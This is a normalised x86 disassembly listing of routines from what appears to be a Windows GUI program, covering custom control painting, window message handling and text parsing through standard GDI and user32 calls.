mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x3
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_43e400
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
lea ebx [ esi + 0x78 ]
test edx edx
jne r-xdata
mov eax edx
push edi
lea edi [ eax + 0x2 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
push edx
push ebx
mov ebx eax
call sub_402910
cmp [ esi + 0x24 ] 0x0
je r-xdata
sub eax edi
sar eax 0x1
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ esi + 0x25 ] 0x0
je r-xdata
mov al [ esi + 0x26 ]
test al al
je r-xdata
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_43e480
push esi
mov esi ecx
cmp [ esi + 0x25 ] 0x0
jne r-xdata
pop esi
retn 0x4
cmp [ esi + 0x1c ] 0x0
je r-xdata
cmp [ esi + 0x25 ] 0x0
jne r-xdata
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x54 ]
push esi
call edx
mov eax [ esi + 0x4 ]
push edi
add eax 0x98
lea edi [ esi + 0x78 ]
call sub_401760
pop edi
sub_43e4c0
push esi
push edi
mov esi ecx
mov ecx [ esi - 0x54 ]
lea edi [ esi - 0x70 ]
push edi
push 0x2a3
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x200
call sub_412fd0
pop edi
pop esi
retn
sub_43e4f0
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
cmp [ esi + 0x24 ] 0x0
mov [ ebp - 0x1c ] eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ esi + 0x4 ]
push ebx
push edi
mov edi [ eax ]
lea ecx [ ecx + 0xb0 ]
lea ebx [ ebp - 0x20 ]
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0x0
call sub_414260
mov ecx [ ebp - 0x18 ]
mov eax [ esi + 0x4 ]
cmp ecx [ eax + 0xb4 ]
je r-xdata
mov eax [ esi + 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
jne r-xdata
mov ebx [ ecx + 0x10 ]
test ebx ebx
je r-xdata
push eax
push edi
call [ SelectObject@IAT ]
mov ecx [ esi + 0x4 ]
mov ebx [ ecx + 0x70 ]
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffffff
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebx ]
mov eax [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx ebx
call edx
mov ecx [ ebx + 0xc ]
mov edx [ ebx + 0x10 ]
xor eax eax
push eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] ecx
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x8 ] edx
mov edx [ ebx ]
mov edx [ edx + 0x14 ]
lea ecx [ esi + 0x30 ]
push ecx
push eax
mov ecx ebx
call edx
push 0x2
push edi
call [ SetBkMode@IAT ]
push ebx
push edi
call [ SetBkColor@IAT ]
push 0x1
push edi
call [ SetBkMode@IAT ]
jmp r-xdata
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x8c ]
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x80 ]
jmp r-xdata
cmp [ esi + 0x27 ] 0x0
je r-xdata
mov eax [ eax + 0x9c ]
dec eax
mov ecx 0x8224
je r-xdata
mov edx [ esi + 0x78 ]
push 0x810
lea ecx [ esi + 0x30 ]
push ecx
push 0xffffffff
push edx
jmp r-xdata
push eax
push edi
call [ SetTextColor@IAT ]
mov [ ebp - 0x1c ] eax
mov eax [ esi + 0x4 ]
cmp [ eax + 0xa8 ] 0x0
je r-xdata
mov ecx 0x8225
dec eax
jne r-xdata
push edi
call [ DrawTextW@IAT ]
mov edx [ ebp - 0x1c ]
push edx
push edi
call [ SetTextColor@IAT ]
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
push edi
call [ SelectObject@IAT ]
pop edi
pop ebx
push 0x1
push edi
call [ SetBkMode@IAT ]
or ecx 0x800
push ecx
mov ecx [ esi + 0x78 ]
lea eax [ esi + 0x30 ]
push eax
push 0xffffffff
push ecx
mov ecx 0x8226
jmp r-xdata
sub_43e690
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi - 0x70 ]
mov edx [ eax + 0x78 ]
lea esi [ edi - 0x70 ]
mov ecx esi
call edx
test al al
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x14
cmp [ edi - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x200
je r-xdata
mov ebx [ ebp + 0x14 ]
mov edx ebx
shr edx 0x10
movsx ecx bx
movsx edx dx
cmp eax 0x200
jne r-xdata
cmp eax 0x2a3
jne r-xdata
cmp eax 0x2a3
jne r-xdata
push edx
push ecx
lea eax [ edi - 0x40 ]
push eax
call [ PtInRect@IAT ]
test eax eax
je r-xdata
mov [ edi + 0x4 ] 0x0
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
cmp [ edi + 0x4 ] 0x0
jne r-xdata
mov [ edi + 0x4 ] 0x1
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov eax [ edx + 0x3c ]
push esi
call eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x6c ]
cmp [ edx - 0xc ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
mov edx [ ebp + 0x10 ]
mov eax [ ecx ]
mov eax [ eax + 0x38 ]
push 0x1
push ebx
push edx
push 0x200
call eax
sub_43e780
push ebp
mov ebp esp
push 0xffffffff
push sub_446942
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
call sub_40e3c0
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ eax + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x1
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0x68 ] 0x1
mov [ ebp - 0x4 ] 0x2
lea ecx [ eax + 0x74 ]
lea esi [ ecx + 0x8 ]
mov [ ecx + 0x4 ] edx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] esi
mov [ esi + 0xc ] edx
mov [ ebp - 0x4 ] 0x4
mov [ ecx + 0x18 ] edx
mov [ ecx + 0x1c ] edx
mov [ ebp - 0x4 ] 0x5
mov esi [ DefWindowProcW@IAT ]
mov [ ecx + 0x20 ] esi
mov [ ebp - 0x4 ] 0x7
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ ecx ] r--data
mov [ eax + 0xc ] 0x14
mov [ eax + 0x1c ] edx
mov [ eax + 0x27 ] 0x1
mov [ eax + 0xa4 ] edx
mov [ eax + 0xa0 ] edx
mov [ eax + 0x9c ] edx
mov [ eax + 0x98 ] edx
mov [ eax + 0xac ] edx
mov [ eax + 0xa8 ] edx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_43e870
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_43e900
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_43e8a0
push ebp
mov ebp esp
push 0xffffffff
push sub_4468d0
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
add eax 0x8
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_443ef4
sub_43e900
push ebp
mov ebp esp
push 0xffffffff
push sub_447662
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x74 ] r--data
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0xa4 ]
mov edi [ DeleteObject@IAT ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov eax [ esi + 0xa0 ]
cmp eax ebx
je r-xdata
push eax
call edi
mov [ esi + 0xa4 ] ebx
mov eax [ esi + 0x9c ]
cmp eax ebx
je r-xdata
push eax
call edi
mov [ esi + 0xa0 ] ebx
mov [ ebp - 0x4 ] bl
lea eax [ esi + 0x74 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] bl
add eax 0x8
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] bl
mov eax [ eax + 0xc ]
cmp eax ebx
je r-xdata
push eax
call edi
mov [ esi + 0x9c ] ebx
or eax 0xffffffff
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x6
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_443ef4
sub_43e9f0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
push eax
push edi
mov esi ecx
call sub_40e4c0
mov [ esi + 0xb0 ] edi
pop edi
pop esi
pop ebp
retn 0x8
sub_43ea10
push ebp
mov ebp esp
push 0xffffffff
push sub_4458d5
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edi [ ecx ]
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x9c ]
mov ebx [ SelectObject@IAT ]
push eax
push edi
call ebx
cmp [ esi + 0x27 ] 0x0
mov [ ebp + 0x8 ] eax
je r-xdata
mov eax [ esi + 0xa0 ]
cmp [ esi + 0x98 ] 0x0
jne r-xdata
mov eax [ esi + 0xa4 ]
jmp r-xdata
push eax
push edi
call ebx
mov edx [ esi + 0x3c ]
mov ecx [ esi + 0x34 ]
mov eax [ esi + 0x30 ]
push edx
mov edx [ esi + 0x38 ]
push edx
push ecx
push eax
push edi
call [ Rectangle@IAT ]
mov edx [ ebp + 0x8 ]
push edx
push edi
call ebx
push 0x0
push edi
call ebx
mov eax [ esi + 0x78 ]
push 0x1
push 0x0
push eax
call [ InvalidateRect@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_43ead0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
mov esi ecx
jne r-xdata
mov ecx [ esi + 0x18 ]
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push ecx
mov ecx esi
call edx
test al al
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x9c ]
mov ecx esi
xor bl bl
call edx
pop esi
mov al bl
pop ebx
pop ebp
retn 0x4
cmp [ esi + 0x25 ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x9c ]
mov bl 0x1
mov ecx esi
mov [ esi + 0x25 ] bl
call edx
pop esi
mov al bl
pop ebx
pop ebp
retn 0x4
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov eax [ esi + 0x70 ]
mov edx [ eax + 0x8 ]
lea ecx [ esi + 0x70 ]
call edx
sub_43eb40
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x90 ]
push edi
push eax
push 0x1
xor ebx ebx
push ebx
call [ CreatePen@IAT ]
mov ecx [ esi + 0x4 ]
mov edi [ CreateSolidBrush@IAT ]
mov [ esi + 0x9c ] eax
mov edx [ ecx + 0x70 ]
push edx
call edi
mov [ esi + 0xa4 ] eax
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x7c ]
push ecx
call edi
mov edx [ esi ]
mov edx [ edx + 0xa0 ]
mov [ esi + 0xa0 ] eax
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
call edx
mov eax [ esi + 0xb0 ]
mov [ esp + 0xc ] 0x56010080
cmp [ eax + 0xd8 ] ebx
je r-xdata
cmp [ eax + 0xdc ] ebx
je r-xdata
mov [ esp + 0xc ] 0x560100a0
cmp [ eax + 0xa8 ] bl
je r-xdata
or [ esp + 0xc ] 0x2000
mov eax [ esi + 0x78 ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0xc ]
and eax 0xffffff7f
or eax 0x44
mov [ esp + 0xc ] eax
mov eax [ esi + 0x18 ]
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x28 ]
mov edi [ esp + 0x24 ]
push ebx
sub edx ecx
push edx
mov edx [ esp + 0x24 ]
sub edi edx
push edi
push ecx
push edx
push eax
call [ MoveWindow@IAT ]
jmp r-xdata
mov [ esp + 0x10 ] ebx
mov ecx [ eax + 0x60 ]
cmp ecx ebx
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + 0xa0 ]
mov edi [ SendMessageW@IAT ]
push 0x1
cmp eax ebx
je r-xdata
mov eax [ esp + 0x14 ]
push eax
lea ecx [ esi + 0x94 ]
push ecx
mov ebx rw-data
call sub_406b60
add esp 0x8
cmp [ esp + 0xc ] 0x0
movzx ebx ax
mov eax 0x56000000
je r-xdata
mov [ rw-data ] r--data
mov [ esp + 0x10 ] ecx
jmp r-xdata
mov eax [ eax + 0x18 ]
cmp eax ebx
jne r-xdata
mov ecx [ rw-data ]
mov edx [ esi + 0x78 ]
push ecx
push 0x30
push edx
push eax
mov eax [ esi + 0x78 ]
push 0x30
push eax
jmp r-xdata
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
push edx
push 0x4
push eax
push 0x0
lea eax [ esp + 0x2c ]
push eax
push ecx
lea eax [ esi + 0x74 ]
call sub_430650
xor ebx ebx
mov eax [ esp + 0x18 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
mov edx [ esp + 0xc ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] edx
cmp [ rw-data ] ebx
jne r-xdata
mov ecx [ esp + 0x2c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn
mov eax [ esi + 0xb0 ]
mov eax [ eax + 0xc8 ]
cmp eax ebx
jle r-xdata
call edi
mov ecx [ esi + 0x78 ]
cmp ecx ebx
je r-xdata
push ebx
push eax
push 0xc5
push ecx
call edi
sub_43ed20
push esi
mov esi ecx
mov eax [ esi + 0xa4 ]
push edi
mov edi [ DeleteObject@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0xa4 ] 0x0
mov eax [ esi + 0x9c ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0xa0 ] 0x0
pop edi
pop esi
retn
push eax
call edi
mov [ esi + 0x9c ] 0x0
sub_43ed90
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov ecx [ eax ]
mov [ esi + 0x40 ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x44 ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x48 ] ecx
mov edx [ eax + 0xc ]
mov [ esi + 0x4c ] edx
mov ecx [ eax ]
mov [ esi + 0x30 ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x34 ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x38 ] ecx
mov edx [ eax + 0xc ]
mov [ esi + 0x3c ] edx
mov ecx [ eax ]
mov [ esi + 0x50 ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x54 ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x58 ] ecx
mov edx [ eax + 0xc ]
mov eax [ esi + 0x78 ]
push eax
mov [ esi + 0x5c ] edx
call [ IsWindow@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov edx [ esi ]
mov edx [ edx + 0xa0 ]
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
call edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
push 0x1
sub ecx eax
push ecx
mov ecx [ ebp - 0x14 ]
sub edx ecx
push edx
push eax
mov eax [ esi + 0x78 ]
push ecx
push eax
call [ MoveWindow@IAT ]
sub_43ee50
push ebp
mov ebp esp
mov eax [ ecx + 0x30 ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
mov edx [ ecx + 0x34 ]
mov [ esi + 0x4 ] edx
mov eax [ ecx + 0x38 ]
mov [ esi + 0x8 ] eax
mov edx [ ecx + 0x3c ]
mov [ esi + 0xc ] edx
mov eax [ ecx + 0xb0 ]
cmp [ eax + 0xe0 ] 0x0
jne r-xdata
mov eax [ eax + 0xe0 ]
add [ esi ] eax
mov edx [ ecx + 0xb0 ]
mov eax [ edx + 0xe4 ]
add [ esi + 0x4 ] eax
mov edx [ ecx + 0xb0 ]
mov eax [ edx + 0xe8 ]
sub [ esi + 0x8 ] eax
mov ecx [ ecx + 0xb0 ]
mov edx [ ecx + 0xec ]
sub [ esi + 0xc ] edx
pop esi
pop ebp
retn 0x4
cmp [ eax + 0xe8 ] 0x0
jne r-xdata
cmp [ eax + 0xe4 ] 0x0
jne r-xdata
cmp [ eax + 0xec ] 0x0
jne r-xdata
cmp [ eax + 0xa8 ] 0x0
je r-xdata
mov eax [ ecx + 0x3c ]
sub eax [ ecx + 0x34 ]
mov edx [ ecx + 0x4 ]
sub eax [ edx + 0xa4 ]
cdq
sub eax edx
sar eax 0x1
add [ esi + 0x4 ] eax
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + 0xa4 ]
mov eax [ esi + 0x4 ]
add [ esi ] 0x2
dec [ esi + 0x8 ]
lea eax [ edx + eax + 0x2 ]
mov [ esi + 0xc ] eax
pop esi
pop ebp
retn 0x4
cmp [ eax + 0xd0 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx + 0xd4 ]
mov ecx [ ecx + 0xd0 ]
neg eax
push eax
neg ecx
push ecx
push esi
call [ InflateRect@IAT ]
pop esi
pop ebp
retn 0x4
cmp [ eax + 0xd4 ] 0x0
jne r-xdata
push 0xfffffffe
push 0x0
push esi
call [ InflateRect@IAT ]
add [ esi ] 0x2
dec [ esi + 0x8 ]
pop esi
pop ebp
retn 0x4
sub_43ef70
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
push esi
mov esi ecx
mov ecx [ esi + 0x78 ]
mov [ esi + 0x27 ] al
movzx eax al
push eax
push ecx
call [ EnableWindow@IAT ]
cmp [ esi + 0x24 ] 0x0
je r-xdata
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_43efd0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
cmp edi 0x1b
jne r-xdata
cmp [ esi + 0x98 ] 0x0
je r-xdata
cmp [ esi + 0x1c ] 0x0
je r-xdata
cmp edi 0xd
jne r-xdata
mov edx [ ebp + 0x14 ]
pop edi
mov [ edx ] 0x1
mov eax 0x1
pop esi
pop ebp
retn 0x10
mov ecx [ ebp + 0x14 ]
pop edi
mov [ ecx ] 0x1
xor eax eax
pop esi
pop ebp
retn 0x10
mov edx [ esi + 0x4 ]
mov edx [ edx + 0x4 ]
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
push edi
push edx
push 0x111
push esi
call eax
cmp edi 0x9
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0xa4 ]
call edx
mov eax [ ebp + 0x14 ]
pop edi
mov [ eax ] 0x1
xor eax eax
pop esi
pop ebp
retn 0x10
cmp edi 0x8
je r-xdata
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ esi + 0x78 ]
push eax
mov eax [ esi + 0x94 ]
push edi
push ecx
push edx
push eax
call [ CallWindowProcW@IAT ]
pop edi
pop esi
pop ebp
retn 0x10
mov ecx edi
mov eax esi
call sub_43f750
test eax eax
je r-xdata
mov ecx [ ebp + 0x14 ]
pop edi
mov [ ecx ] 0x1
xor eax eax
pop esi
pop ebp
retn 0x10
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x10 ]
push edi
push eax
push 0x111
push esi
call edx
mov eax [ esi + 0x78 ]
push 0x1
push 0x0
push eax
call [ InvalidateRect@IAT ]
mov edx [ ebp + 0x14 ]
pop edi
mov [ edx ] 0x1
xor eax eax
pop esi
pop ebp
retn 0x10
sub_43f0d0
push ebp
mov ebp esp
push 0xffffffff
push sub_4499d8
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0xb0 ]
cmp [ eax + 0xdc ] 0x0
je r-xdata
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
lea ebx [ esi + 0x78 ]
lea edi [ ebp - 0x10 ]
call sub_419a00
mov eax [ ebp - 0x10 ]
mov ecx [ eax - 0xc ]
test ecx ecx
jns r-xdata
mov eax [ esi ]
mov edx [ eax + 0xa8 ]
mov ecx esi
call edx
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x10 ]
push 0x0
push eax
push 0x111
push esi
call edx
cmp [ eax ] 0x30
jne r-xdata
push 0x80070057
call sub_402d00
lea edi [ ebp - 0x10 ]
call sub_419a00
mov edi [ ebp - 0x10 ]
push edi
call [ _wtol@IAT ]
mov ecx [ esi + 0xac ]
add esp 0x4
test ecx ecx
jne r-xdata
cmp ecx 0x1
jle r-xdata
cmp eax ecx
jl r-xdata
cmp [ esi + 0xa8 ] ecx
je r-xdata
push eax
call [ _wtol@IAT ]
push eax
push r--data
lea edi [ ebp - 0x10 ]
call sub_401dc0
mov esi [ ebp - 0x10 ]
mov ecx [ ebx ]
add esp 0xc
push esi
push ecx
call [ SetWindowTextW@IAT ]
mov edx [ ebx ]
push 0x0
push 0x23
push 0x100
push edx
call [ SendMessageW@IAT ]
push ecx
push r--data
lea edi [ ebp - 0x10 ]
call sub_401dc0
mov esi [ ebp - 0x10 ]
mov ecx [ ebx ]
add esp 0x8
push esi
push ecx
call [ SetWindowTextW@IAT ]
mov edx [ ebx ]
push 0x0
push 0x23
push 0x100
push edx
call [ SendMessageW@IAT ]
jmp r-xdata
mov ecx [ esi + 0xa8 ]
cmp eax ecx
jle r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ edi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ esi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_43f280
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_449981
mov eax [ fs : 0x0 ]
push eax
sub esp 0x88
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x80 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x98 ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0xc ]
mov esi ecx
mov [ esp + 0x20 ] esi
mov [ esp + 0x18 ] edi
mov [ esp + 0x13 ] 0x0
test edi edi
jne r-xdata
mov edx [ esi + 0x78 ]
push 0x0
push 0x0
lea ebx [ esi + 0x78 ]
push 0x31
push edx
mov [ esp + 0x38 ] ebx
call [ SendMessageW@IAT ]
push eax
push edi
call [ SelectObject@IAT ]
mov ecx [ ebx ]
mov [ esp + 0x30 ] eax
xor eax eax
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] eax
lea eax [ esp + 0x3c ]
push eax
push ecx
call [ GetClientRect@IAT ]
cmp [ esi + 0x27 ] 0x0
je r-xdata
mov ecx [ esi + 0x78 ]
lea eax [ esp + 0x4c ]
push eax
push ecx
mov [ esp + 0x1b ] 0x1
call [ BeginPaint@IAT ]
mov [ esp + 0x18 ] eax
mov edi eax
mov ecx [ esi + 0xa0 ]
push ecx
lea edx [ esp + 0x40 ]
push edx
cmp [ esi + 0x98 ] 0x0
jne r-xdata
cmp [ ecx + 0xd8 ] 0x0
je r-xdata
cmp [ edi - 0xc ] 0x0
jne r-xdata
mov edx [ esi + 0xa4 ]
push edx
lea eax [ esp + 0x40 ]
push eax
jmp r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x18 ]
push eax
push ecx
call [ SetTextColor@IAT ]
mov [ esp + 0x1c ] eax
call [ Ordinal_crt_10@IAT ]
test al al
je r-xdata
mov edx [ ebx ]
push 0x0
push 0x0
push 0xd2
push edx
call [ SendMessageW@IAT ]
movzx eax ax
mov [ esp + 0x1c ] eax
mov eax [ edi - 0xc ]
xor esi esi
mov [ esp + 0x2c ] eax
test eax eax
jle r-xdata
lea edi [ esp + 0x14 ]
call sub_401760
mov eax [ esi + 0xb0 ]
mov ecx [ eax + 0xc4 ]
mov edi [ esp + 0x14 ]
mov [ esp + 0x24 ] ecx
jmp r-xdata
push edi
call [ FillRect@IAT ]
push 0x1
push edi
call [ SetBkMode@IAT ]
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x80 ]
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov [ esp + 0x24 ] ecx
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0x14 ] eax
mov [ esp + 0xa0 ] 0x1
lea edi [ esp + 0x14 ]
call sub_419a00
mov ecx [ esi + 0xb0 ]
mov edx [ ecx + 0xc0 ]
cmp [ edx - 0xc ] 0x0
mov edi [ esp + 0x14 ]
lea eax [ ecx + 0xc0 ]
je r-xdata
mov eax [ esi + 0xb0 ]
